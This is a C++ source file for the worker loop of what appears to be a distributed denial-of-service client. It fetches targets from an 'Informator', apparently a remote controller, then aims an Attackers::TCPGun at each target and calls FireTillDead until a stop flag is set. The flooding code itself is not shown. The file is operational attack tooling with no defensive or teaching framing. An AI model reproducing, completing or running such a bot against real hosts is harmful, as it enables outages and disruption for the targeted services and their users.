#include "solider.h"

#include "http_gun.h"
#include "tcp_gun.h"
#include "api_interface.h"
#include "globals.h"

void Solider::operator()() noexcept
{
	Informator informer;
	while(!g_shouldStop.load())
	{
		std::cout << "Loading new response" << std::endl;
		while(!informer.LoadNewData())
		{
		}

		std::cout << "Getting target" << std::endl;
		const auto targetURI = informer.GetTarget();
		if(!targetURI)
		{
			continue;
		}

		std::cout << "Choosing method for: " << *targetURI << std::endl;
		if(const auto method{informer.GetMethod()})
		{
			std::unique_ptr<Attackers::IGun> currentGun{new Attackers::TCPGun()};

			if(const auto target{currentGun->Aim(*targetURI)})
			{
				std::cout << "Got aim, firing" << std::endl;
				currentGun->FireTillDead(*target);
			}
		}
	}
}
